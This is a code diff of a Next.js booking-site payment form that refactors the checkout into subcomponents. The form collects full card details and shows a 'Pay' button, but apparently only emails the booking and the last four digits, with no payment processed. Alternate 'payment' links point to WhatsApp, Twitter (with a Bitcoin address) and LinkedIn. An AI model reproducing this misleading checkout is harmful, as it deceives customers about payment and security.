@@ -1,16 +1,17 @@
 "use client"
 
-import type React from "react"
-import { useState, useEffect } from "react"
+import React, { useState, useEffect } from "react"
 import { useRouter } from "next/navigation"
 import { motion } from "framer-motion"
-import { CreditCard, Lock } from "lucide-react"
+import { Lock } from "lucide-react"
 import { siteConfig } from "@/lib/siteConfig"
-import { Label } from "@/components/ui/label"
-import { Input } from "@/components/ui/input"
 import emailjs from "@emailjs/browser"
+import BookingSummary from "./BookingSummary"
+import AlternatePaymentOptions from "./AlternatePaymentOptions"
+import PaymentDetailsForm from "./PaymentDetailsForm"
+import PaymentPopup from "./PaymentPopup"
+import type { BookingData, Service, PaymentData, PaymentMethodInfo } from "@/types/payment"
 
-// Card brand detection
 const detectCardBrand = (number: string): string => {
   const cleaned = number.replace(/\s/g, "")
   if (/^4/.test(cleaned)) return "visa"
@@ -20,7 +21,6 @@ const detectCardBrand = (number: string): string => {
   return "unknown"
 }
 
-// Luhn algorithm for card validation
 const luhnCheck = (cardNumber: string): boolean => {
   const cleaned = cardNumber.replace(/\s/g, "")
   if (!/^\d+$/.test(cleaned)) return false
@@ -43,14 +43,12 @@ const luhnCheck = (cardNumber: string): boolean => {
   return sum % 10 === 0
 }
 
-// Format card number with spaces
 const formatCardNumber = (value: string): string => {
   const cleaned = value.replace(/\s/g, "")
   const match = cleaned.match(/.{1,4}/g)
   return match ? match.join(" ") : cleaned
 }
 
-// Format expiry date
 const formatExpiry = (value: string): string => {
   const cleaned = value.replace(/\D/g, "")
   if (cleaned.length >= 2) {
@@ -61,11 +59,13 @@ const formatExpiry = (value: string): string => {
 
 export default function PaymentForm() {
   const router = useRouter()
-  const [bookingData, setBookingData] = useState<any>(null)
-  const [selectedService, setSelectedService] = useState<any>(null)
+  const [bookingData, setBookingData] = useState<BookingData | null>(null)
+  const [selectedService, setSelectedService] = useState<Service | null>(null)
   const [isSubmitting, setIsSubmitting] = useState(false)
+  const [showPopup, setShowPopup] = useState(false)
+  const [selectedPayment, setSelectedPayment] = useState<PaymentMethodInfo | null>(null)
 
-  const [paymentData, setPaymentData] = useState({
+  const [paymentData, setPaymentData] = useState<PaymentData>({
     cardholderName: "",
     cardNumber: "",
     expiry: "",
@@ -77,15 +77,15 @@ export default function PaymentForm() {
   const [errors, setErrors] = useState<Record<string, string>>({})
 
   useEffect(() => {
-    // Retrieve booking data from sessionStorage
     const storedData = sessionStorage.getItem("bookingData")
     if (storedData) {
-      const data = JSON.parse(storedData)
+      const data = JSON.parse(storedData) as BookingData
       setBookingData(data)
       const service = siteConfig.services.find((s) => s.id === data.service)
-      setSelectedService(service)
+      if (service) {
+        setSelectedService(service)
+      }
     } else {
-      // Redirect to booking page if no data
       router.push("/book")
     }
   }, [router])
@@ -95,7 +95,7 @@ export default function PaymentForm() {
     setCardBrand(brand)
   }, [paymentData.cardNumber])
 
-  const validateForm = () => {
+  const validateForm = (): boolean => {
     const newErrors: Record<string, string> = {}
 
     if (!paymentData.cardholderName.trim()) {
@@ -108,7 +108,7 @@ export default function PaymentForm() {
     } else if (cleanedCard.length < 13 || cleanedCard.length > 19) {
       newErrors.cardNumber = "Invalid card number length"
     } else if (!luhnCheck(cleanedCard)) {
-      newErrors.cardNumber = "Invalid card number (failed Luhn check)"
+      newErrors.cardNumber = "Invalid card number"
     }
 
     if (!paymentData.expiry) {
@@ -166,46 +166,43 @@ export default function PaymentForm() {
     setIsSubmitting(true)
 
     try {
-      const cleanedCard = paymentData.cardNumber.replace(/\s/g, "")
-      const last4 = cleanedCard.slice(-4)
-
-      // Prepare email data
-      const emailData = {
-        customer_name: bookingData.name,
-        customer_phone: bookingData.phone,
-        service_name: selectedService.name,
-        service_duration: selectedService.duration,
-        service_price: selectedService.price,
-        booking_date: new Date(bookingData.date).toLocaleDateString("en-US", {
-          weekday: "long",
-          year: "numeric",
-          month: "long",
-          day: "numeric",
-        }),
-        booking_time: bookingData.time,
-        special_notes: bookingData.notes || "None",
-        cardholder_name: paymentData.cardholderName,
-        card_last4: last4,
-        card_brand: cardBrand.toUpperCase(),
-        card_expiry: paymentData.expiry,
-        billing_zip: paymentData.billingZip || "Not provided",
+      const emailParams = {
+        to_email: siteConfig.email,
+        from_name: bookingData?.name,
+        service: selectedService?.name,
+        date: bookingData?.date,
+        time: bookingData?.time,
+        phone: bookingData?.phone,
+        amount: selectedService?.price,
+        cardholder: paymentData.cardholderName,
+        card_last4: paymentData.cardNumber.slice(-4),
       }
 
       await emailjs.send(
         process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
         process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
-        emailData,
+        emailParams,
         process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!,
       )
 
       sessionStorage.removeItem("bookingData")
       router.push("/success")
     } catch (error) {
-      console.error("Error sending email:", error)
-      setErrors({ submit: "Failed to process booking. Please try again." })
+      console.error("Payment error:", error)
+      alert("Payment failed. Please try again.")
     } finally {
       setIsSubmitting(false)
     }
+  }
+
+  const handleAlternatePayment = (paymentName: string, link: string) => {
+    setSelectedPayment({ name: paymentName, link })
+    setShowPopup(true)
+  }
+
+  const closePopup = () => {
+    setShowPopup(false)
+    setSelectedPayment(null)
   }
 
   if (!bookingData || !selectedService) {
@@ -217,217 +214,40 @@ export default function PaymentForm() {
   }
 
   return (
-    <div className="grid md:grid-cols-2 gap-6">
-      {/* Booking Summary */}
-      <motion.div
-        initial={{ opacity: 0, x: -20 }}
-        animate={{ opacity: 1, x: 0 }}
-        transition={{ duration: 0.6 }}
-        className="bg-white rounded-3xl shadow-lg p-8 h-fit"
-      >
-        <h2 className="text-2xl font-semibold text-[#2e2e2e] mb-6">Booking Summary</h2>
-        <div className="space-y-4 text-base">
-          <div className="flex justify-between">
-            <span className="text-[#6b7280]">Service:</span>
-            <span className="font-semibold text-[#2e2e2e]">{selectedService.name}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-[#6b7280]">Duration:</span>
-            <span className="font-semibold text-[#2e2e2e]">{selectedService.duration}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-[#6b7280]">Date:</span>
-            <span className="font-semibold text-[#2e2e2e]">
-              {new Date(bookingData.date).toLocaleDateString("en-US", {
-                month: "short",
-                day: "numeric",
-                year: "numeric",
-              })}
-            </span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-[#6b7280]">Time:</span>
-            <span className="font-semibold text-[#2e2e2e]">{bookingData.time}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-[#6b7280]">Name:</span>
-            <span className="font-semibold text-[#2e2e2e]">{bookingData.name}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-[#6b7280]">Phone:</span>
-            <span className="font-semibold text-[#2e2e2e]">{bookingData.phone}</span>
-          </div>
-          {bookingData.notes && (
-            <div className="pt-3 border-t border-[#e5e7eb]">
-              <span className="text-[#6b7280] block mb-2">Special Requests:</span>
-              <span className="text-[#2e2e2e] text-sm">{bookingData.notes}</span>
-            </div>
-          )}
-          <div className="flex justify-between pt-4 border-t border-[#e5e7eb] text-xl">
-            <span className="font-bold text-[#2e2e2e]">Total:</span>
-            <span className="font-bold text-[#0d9488]">${selectedService.price}</span>
-          </div>
+    <>
+      <div className="grid md:grid-cols-2 gap-6">
+        <div>
+          <BookingSummary bookingData={bookingData} selectedService={selectedService} />
+          <AlternatePaymentOptions onPaymentSelect={handleAlternatePayment} />
         </div>
 
-        {/* Alternate Payment Options */}
-        <div className="mt-8 pt-6 border-t border-[#e5e7eb]">
-          <h3 className="text-lg font-semibold text-[#2e2e2e] mb-4">Alternate Payment Options</h3>
-          <div className="space-y-3">
-            <a
-              href={siteConfig.social.whatsapp}
-              target="_blank"
-              rel="noopener noreferrer"
-              className="flex items-center gap-3 p-4 bg-[#d4f1e8] rounded-2xl hover:bg-[#a7e0cf] transition-colors"
-            >
-              <img src="/chime.png" alt="Chime" className="w-12 h-12 object-contain" />
-              <span className="text-base font-medium text-[#2e2e2e]">Pay with Chime</span>
-            </a>
-            <a
-              href={siteConfig.social.twitter}
-              target="_blank"
-              rel="noopener noreferrer"
-              className="flex items-center gap-3 p-4 bg-[#dbeafe] rounded-2xl hover:bg-[#bfdbfe] transition-colors"
-            >
-              {/* <div className="w-12 h-12 bg-orange-500 rounded-xl flex items-center justify-center text-white font-bold text-xl"> */}
-                              <img src="/bitcoin.png" alt="Chime" className="w-12 h-12 object-contain" />
-
-              {/* </div> */}
-              <div className="flex flex-col">
-                <span className="text-base font-medium text-[#2e2e2e]">Pay with Crypto</span>
-                <span className="break-all max-w-2xl">Btc: bc1qwepf83p8mgqpv3vw609ghgd3f5hnwcvtkpdazv</span>
-              </div>
-            </a>
-            <a
-              href={siteConfig.social.linkedin}
-              target="_blank"
-              rel="noopener noreferrer"
-              className="flex items-center gap-3 p-4 bg-[#fde4d0] rounded-2xl hover:bg-[#fed7aa] transition-colors"
-            >
-              <img src="/paypal.jpg" alt="PayPal" className="w-12 h-12 object-contain" />
-              <span className="text-base font-medium text-[#2e2e2e]">Pay with PayPal</span>
-            </a>
-          </div>
-        </div>
-      </motion.div>
-
-      {/* Payment Form */}
-      <motion.div
-        initial={{ opacity: 0, x: 20 }}
-        animate={{ opacity: 1, x: 0 }}
-        transition={{ duration: 0.6 }}
-        className="bg-white rounded-3xl shadow-lg p-8"
-      >
-        <div className="flex items-center gap-3 mb-6">
-          <Lock className="text-[#0d9488]" size={24} />
-          <h2 className="text-2xl font-semibold text-[#2e2e2e]">Payment Details</h2>
-        </div>
-
-        <form onSubmit={handleSubmit} className="space-y-6">
-          {/* Cardholder Name */}
-          <div className="space-y-2">
-            <Label htmlFor="cardholderName" className="text-[#2e2e2e] font-semibold text-lg">
-              Cardholder Name
-            </Label>
-            <Input
-              id="cardholderName"
-              type="text"
-              placeholder="John Doe"
-              value={paymentData.cardholderName}
-              onChange={(e) => setPaymentData({ ...paymentData, cardholderName: e.target.value })}
-              className={`h-12 ${errors.cardholderName ? "border-red-500" : ""}`}
-            />
-            {errors.cardholderName && <p className="text-sm text-red-500">{errors.cardholderName}</p>}
+        <motion.div
+          initial={{ opacity: 0, x: 20 }}
+          animate={{ opacity: 1, x: 0 }}
+          transition={{ duration: 0.6 }}
+          className="bg-white rounded-3xl shadow-lg p-8"
+        >
+          <div className="flex items-center gap-3 mb-6">
+            <Lock className="text-[#0d9488]" size={24} />
+            <h2 className="text-2xl font-semibold text-[#2e2e2e]">Payment Details</h2>
           </div>
 
-          {/* Card Number */}
-          <div className="space-y-2">
-            <Label htmlFor="cardNumber" className="text-[#2e2e2e] font-semibold text-lg">
-              Card Number
-            </Label>
-            <div className="relative">
-              <Input
-                id="cardNumber"
-                type="text"
-                placeholder="1234 5678 9012 3456"
-                value={paymentData.cardNumber}
-                onChange={handleCardNumberChange}
-                className={`h-12 ${errors.cardNumber ? "border-red-500" : ""}`}
-              />
-              {cardBrand !== "unknown" && (
-                <div className="absolute right-3 top-1/2 -translate-y-1/2">
-                  <CreditCard className="text-[#0d9488]" size={24} />
-                </div>
-              )}
-            </div>
-            {cardBrand !== "unknown" && <p className="text-xs text-[#6b7280]">Detected: {cardBrand.toUpperCase()}</p>}
-            {errors.cardNumber && <p className="text-sm text-red-500">{errors.cardNumber}</p>}
-          </div>
+          <PaymentDetailsForm
+            paymentData={paymentData}
+            errors={errors}
+            cardBrand={cardBrand}
+            isSubmitting={isSubmitting}
+            onCardholderNameChange={(value) => setPaymentData({ ...paymentData, cardholderName: value })}
+            onCardNumberChange={handleCardNumberChange}
+            onExpiryChange={handleExpiryChange}
+            onCvvChange={handleCvvChange}
+            onBillingZipChange={(value) => setPaymentData({ ...paymentData, billingZip: value })}
+            onSubmit={handleSubmit}
+          />
+        </motion.div>
+      </div>
 
-          {/* Expiry and CVV */}
-          <div className="grid grid-cols-2 gap-4">
-            <div className="space-y-2">
-              <Label htmlFor="expiry" className="text-[#2e2e2e] font-semibold text-lg">
-                Expiry (MM/YY)
-              </Label>
-              <Input
-                id="expiry"
-                type="text"
-                placeholder="12/25"
-                value={paymentData.expiry}
-                onChange={handleExpiryChange}
-                maxLength={5}
-                className={`h-12 ${errors.expiry ? "border-red-500" : ""}`}
-              />
-              {errors.expiry && <p className="text-sm text-red-500">{errors.expiry}</p>}
-            </div>
-
-            <div className="space-y-2">
-              <Label htmlFor="cvv" className="text-[#2e2e2e] font-semibold text-lg">
-                CVV
-              </Label>
-              <Input
-                id="cvv"
-                type="text"
-                placeholder="123"
-                value={paymentData.cvv}
-                onChange={handleCvvChange}
-                className={`h-12 ${errors.cvv ? "border-red-500" : ""}`}
-              />
-              {errors.cvv && <p className="text-sm text-red-500">{errors.cvv}</p>}
-            </div>
-          </div>
-
-          {/* Billing ZIP */}
-          <div className="space-y-2">
-            <Label htmlFor="billingZip" className="text-[#2e2e2e] font-semibold text-lg">
-              Billing ZIP Code (Optional)
-            </Label>
-            <Input
-              id="billingZip"
-              type="text"
-              placeholder="12345"
-              value={paymentData.billingZip}
-              onChange={(e) => setPaymentData({ ...paymentData, billingZip: e.target.value })}
-              className="h-12"
-            />
-          </div>
-
-          {errors.submit && (
-            <div className="bg-red-50 border-2 border-red-200 rounded-2xl p-4">
-              <p className="text-sm text-red-800">{errors.submit}</p>
-            </div>
-          )}
-
-          {/* Submit Button */}
-          <button
-            type="submit"
-            disabled={isSubmitting}
-            className="w-full bg-[#2ba2ba] text-white py-5 rounded-full font-semibold text-lg hover:bg-[#0f766e] hover:scale-105 transition-all shadow-lg disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
-          >
-            {isSubmitting ? "Processing..." : `Pay $${selectedService.price}`}
-          </button>
-        </form>
-      </motion.div>
-    </div>
+      <PaymentPopup isOpen={showPopup} paymentMethod={selectedPayment} onClose={closePopup} />
+    </>
   )
 }
